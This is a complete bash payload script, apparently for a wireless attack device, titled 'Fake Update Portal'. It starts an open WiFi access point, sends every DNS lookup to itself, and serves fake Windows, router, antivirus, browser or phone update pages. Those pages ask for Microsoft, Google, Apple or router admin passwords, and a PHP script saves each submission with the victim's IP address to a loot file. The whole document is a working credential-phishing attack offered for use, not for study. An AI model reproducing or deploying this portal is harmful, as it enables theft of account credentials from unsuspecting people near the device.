#!/bin/bash
# Title: Fake Update Portal
# Author: bad-antics
# Description: Captive portal disguised as software update
# Category: nullsec/social

LOOT_DIR="/mmc/nullsec/creds"
mkdir -p "$LOOT_DIR"

PROMPT "FAKE UPDATE PORTAL

Creates WiFi that shows
fake software update
requiring credentials.

Templates:
- Windows Update
- Router Firmware
- Antivirus Update
- Browser Update

Press OK to configure."

[ ! -d "/sys/class/net/wlan0" ] && { ERROR_DIALOG "wlan0 not found!"; exit 1; }

PROMPT "SELECT TEMPLATE:

1. Windows Update
2. Router Firmware Update
3. Antivirus Critical
4. Chrome/Firefox Update
5. iOS/Android Update

Enter number next."

TEMPLATE=$(NUMBER_PICKER "Template (1-5):" 1)

case $TEMPLATE in
    1) DEFAULT_SSID="WindowsUpdate" ;;
    2) DEFAULT_SSID="Router_Update" ;;
    3) DEFAULT_SSID="SecurityUpdate" ;;
    4) DEFAULT_SSID="BrowserUpdate" ;;
    5) DEFAULT_SSID="PhoneUpdate" ;;
esac

SSID=$(TEXT_PICKER "AP SSID:" "$DEFAULT_SSID")
DURATION=$(NUMBER_PICKER "Duration (sec):" 600)
CRED_LOG="$LOOT_DIR/update_$(date +%Y%m%d_%H%M).txt"

resp=$(CONFIRMATION_DIALOG "LAUNCH PORTAL?

SSID: $SSID
Template: $TEMPLATE
Duration: ${DURATION}s

Press OK to begin.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

killall hostapd dnsmasq php 2>/dev/null

PORTAL_DIR="/tmp/update_portal"
mkdir -p "$PORTAL_DIR"

# Generate template
case $TEMPLATE in
    1) # Windows
cat > "$PORTAL_DIR/index.html" << 'WINHTML'
<!DOCTYPE html>
<html>
<head>
<title>Windows Update</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{margin:0;font-family:'Segoe UI',sans-serif;background:#0078d4;color:white;min-height:100vh;display:flex;align-items:center;justify-content:center;}
.container{text-align:center;padding:40px;}
.logo{font-size:80px;margin-bottom:20px;}
h1{font-weight:300;margin-bottom:10px;}
.progress{width:300px;height:4px;background:rgba(255,255,255,0.3);margin:30px auto;border-radius:2px;overflow:hidden;}
.progress-bar{height:100%;width:0;background:white;animation:load 3s ease-out forwards;}
@keyframes load{to{width:100%;}}
.form{background:white;color:#333;padding:30px;border-radius:4px;margin-top:30px;max-width:350px;text-align:left;}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box;}
button{width:100%;padding:12px;background:#0078d4;color:white;border:none;border-radius:4px;cursor:pointer;font-size:16px;margin-top:10px;}
.warning{background:#fff3cd;border-left:4px solid #ffc107;padding:10px;margin-bottom:15px;font-size:13px;}
</style>
</head>
<body>
<div class="container">
<div class="logo">⊞</div>
<h1>Windows Update</h1>
<p>Critical security update required</p>
<div class="progress"><div class="progress-bar"></div></div>
<div class="form">
<div class="warning">⚠️ Authentication required to complete update</div>
<form method="POST" action="/capture.php">
<input type="text" name="username" placeholder="Microsoft Account Email" required>
<input type="password" name="password" placeholder="Password" required>
<input type="hidden" name="template" value="windows">
<button type="submit">Verify & Continue</button>
</form>
</div>
</div>
</body>
</html>
WINHTML
    ;;
    2) # Router
cat > "$PORTAL_DIR/index.html" << 'ROUTHTML'
<!DOCTYPE html>
<html>
<head>
<title>Firmware Update Required</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{font-family:Arial;background:#f5f5f5;margin:0;padding:20px;}
.container{max-width:500px;margin:0 auto;background:white;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);}
.header{background:#d32f2f;color:white;padding:15px;text-align:center;border-radius:8px 8px 0 0;}
.content{padding:25px;}
.alert{background:#ffebee;border:1px solid #ef5350;padding:15px;border-radius:4px;margin-bottom:20px;}
.alert h3{color:#c62828;margin:0 0 10px 0;}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box;}
button{width:100%;padding:14px;background:#d32f2f;color:white;border:none;border-radius:4px;cursor:pointer;font-size:16px;}
ul{font-size:14px;color:#666;}
</style>
</head>
<body>
<div class="container">
<div class="header"><h2>⚠️ CRITICAL FIRMWARE UPDATE</h2></div>
<div class="content">
<div class="alert">
<h3>Security Vulnerability Detected!</h3>
<p>Your router firmware is outdated and vulnerable to remote attacks.</p>
</div>
<p><strong>Update includes:</strong></p>
<ul>
<li>Critical security patches</li>
<li>Performance improvements</li>
<li>Bug fixes</li>
</ul>
<form method="POST" action="/capture.php">
<p><strong>Enter router credentials to update:</strong></p>
<input type="text" name="username" placeholder="Admin Username" value="admin">
<input type="password" name="password" placeholder="Admin Password" required>
<input type="hidden" name="template" value="router">
<button type="submit">Install Update Now</button>
</form>
</div>
</div>
</body>
</html>
ROUTHTML
    ;;
    3) # Antivirus
cat > "$PORTAL_DIR/index.html" << 'AVHTML'
<!DOCTYPE html>
<html>
<head>
<title>Security Alert!</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{font-family:Arial;background:#1a1a1a;color:white;margin:0;padding:20px;min-height:100vh;}
.container{max-width:450px;margin:0 auto;text-align:center;}
.shield{font-size:100px;color:#ff5722;animation:pulse 1s infinite;}
@keyframes pulse{0%,100%{opacity:1;}50%{opacity:0.5;}}
h1{color:#ff5722;}
.threat{background:#2d2d2d;padding:15px;border-radius:8px;margin:20px 0;border-left:4px solid #ff5722;}
.form{background:#2d2d2d;padding:25px;border-radius:8px;text-align:left;}
input{width:100%;padding:12px;margin:10px 0;border:none;border-radius:4px;box-sizing:border-box;}
button{width:100%;padding:14px;background:#4caf50;color:white;border:none;border-radius:4px;cursor:pointer;font-size:16px;}
.stats{display:flex;justify-content:space-around;margin:20px 0;}
.stat{text-align:center;}
.stat-num{font-size:24px;color:#ff5722;}
</style>
</head>
<body>
<div class="container">
<div class="shield">🛡️</div>
<h1>THREATS DETECTED!</h1>
<div class="stats">
<div class="stat"><div class="stat-num">3</div>Viruses</div>
<div class="stat"><div class="stat-num">7</div>Malware</div>
<div class="stat"><div class="stat-num">12</div>Trackers</div>
</div>
<div class="threat">
<strong>⚠️ Immediate action required!</strong><br>
Your network is under attack. Update your security software now.
</div>
<div class="form">
<form method="POST" action="/capture.php">
<p>Enter credentials to activate protection:</p>
<input type="email" name="email" placeholder="Email Address" required>
<input type="password" name="password" placeholder="Password" required>
<input type="hidden" name="template" value="antivirus">
<button type="submit">🛡️ Activate Protection</button>
</form>
</div>
</div>
</body>
</html>
AVHTML
    ;;
    4) # Browser
cat > "$PORTAL_DIR/index.html" << 'BROWHTML'
<!DOCTYPE html>
<html>
<head>
<title>Browser Update Required</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{font-family:-apple-system,sans-serif;background:#f8f9fa;margin:0;padding:40px 20px;}
.container{max-width:400px;margin:0 auto;background:white;padding:30px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.1);text-align:center;}
.icon{font-size:60px;margin-bottom:20px;}
h1{font-size:22px;color:#333;margin-bottom:10px;}
p{color:#666;font-size:14px;line-height:1.6;}
.warning{background:#fff3e0;border-radius:8px;padding:15px;margin:20px 0;text-align:left;}
.warning-title{color:#e65100;font-weight:bold;margin-bottom:5px;}
input{width:100%;padding:14px;margin:8px 0;border:1px solid #e0e0e0;border-radius:8px;box-sizing:border-box;font-size:16px;}
button{width:100%;padding:14px;background:#1a73e8;color:white;border:none;border-radius:8px;font-size:16px;cursor:pointer;margin-top:10px;}
</style>
</head>
<body>
<div class="container">
<div class="icon">🌐</div>
<h1>Browser Update Required</h1>
<p>Your browser needs to be updated to access this network securely.</p>
<div class="warning">
<div class="warning-title">⚠️ Security Notice</div>
Outdated browsers may expose your data to attackers.
</div>
<form method="POST" action="/capture.php">
<input type="email" name="email" placeholder="Google Account Email">
<input type="password" name="password" placeholder="Password" required>
<input type="hidden" name="template" value="browser">
<button type="submit">Update & Connect</button>
</form>
</div>
</body>
</html>
BROWHTML
    ;;
    5) # Mobile
cat > "$PORTAL_DIR/index.html" << 'MOBHTML'
<!DOCTYPE html>
<html>
<head>
<title>System Update</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:linear-gradient(180deg,#667eea 0%,#764ba2 100%);margin:0;padding:40px 20px;min-height:100vh;}
.container{max-width:350px;margin:0 auto;background:white;border-radius:20px;padding:30px;box-shadow:0 10px 40px rgba(0,0,0,0.2);}
.icon{text-align:center;font-size:50px;margin-bottom:15px;}
h1{text-align:center;font-size:20px;color:#333;margin:0 0 5px 0;}
.version{text-align:center;color:#888;font-size:13px;margin-bottom:20px;}
.features{background:#f5f5f5;border-radius:12px;padding:15px;margin-bottom:20px;}
.feature{display:flex;align-items:center;padding:8px 0;font-size:14px;}
.feature span{margin-right:10px;}
input{width:100%;padding:14px;margin:8px 0;border:1px solid #e0e0e0;border-radius:10px;box-sizing:border-box;font-size:16px;}
button{width:100%;padding:14px;background:linear-gradient(90deg,#667eea,#764ba2);color:white;border:none;border-radius:10px;font-size:16px;cursor:pointer;}
</style>
</head>
<body>
<div class="container">
<div class="icon">📱</div>
<h1>System Update Available</h1>
<div class="version">Version 18.2.1 → 18.3.0</div>
<div class="features">
<div class="feature"><span>🔒</span> Security patches</div>
<div class="feature"><span>🚀</span> Performance boost</div>
<div class="feature"><span>🐛</span> Bug fixes</div>
</div>
<form method="POST" action="/capture.php">
<input type="text" name="username" placeholder="Apple ID / Google Account" required>
<input type="password" name="password" placeholder="Password" required>
<input type="hidden" name="template" value="mobile">
<button type="submit">Install Update</button>
</form>
</div>
</body>
</html>
MOBHTML
    ;;
esac

# Capture script
cat > "$PORTAL_DIR/capture.php" << CAPPHP
<?php
\$log = "$CRED_LOG";
\$ts = date("Y-m-d H:i:s");
\$ip = \$_SERVER['REMOTE_ADDR'];
\$data = "";
foreach (\$_POST as \$k => \$v) { \$data .= "\$k=\$v "; }
file_put_contents(\$log, "[\$ts] IP:\$ip \$data\n", FILE_APPEND);
header("Location: /success.html");
?>
CAPPHP

cat > "$PORTAL_DIR/success.html" << 'SUCCESSHTML'
<!DOCTYPE html>
<html><head><title>Updating...</title>
<style>body{font-family:Arial;text-align:center;padding:50px;background:#f5f5f5;}
.spinner{width:50px;height:50px;border:4px solid #ddd;border-top:4px solid #4caf50;border-radius:50%;animation:spin 1s linear infinite;margin:20px auto;}
@keyframes spin{to{transform:rotate(360deg);}}</style>
</head><body>
<div class="spinner"></div>
<h2>Installing Update...</h2>
<p>Please wait, this may take a few minutes.</p>
</body></html>
SUCCESSHTML

# Start services
LOG "Starting Fake Update Portal..."

cat > /tmp/update_hostapd.conf << EOF
interface=wlan0
driver=nl80211
ssid=$SSID
hw_mode=g
channel=6
auth_algs=1
wpa=0
EOF

hostapd /tmp/update_hostapd.conf &
sleep 2
ifconfig wlan0 10.0.0.1 netmask 255.255.255.0 up

cat > /tmp/update_dns.conf << EOF
interface=wlan0
dhcp-range=10.0.0.10,10.0.0.100,5m
address=/#/10.0.0.1
EOF
dnsmasq -C /tmp/update_dns.conf &

cd "$PORTAL_DIR" && php -S 10.0.0.1:80 &

LOG "Portal active: $SSID"
sleep $DURATION

killall hostapd dnsmasq php 2>/dev/null

CRED_COUNT=$(wc -l < "$CRED_LOG" 2>/dev/null || echo 0)

PROMPT "FAKE UPDATE COMPLETE

SSID: $SSID
Credentials: $CRED_COUNT

Log: $CRED_LOG

Press OK to exit."
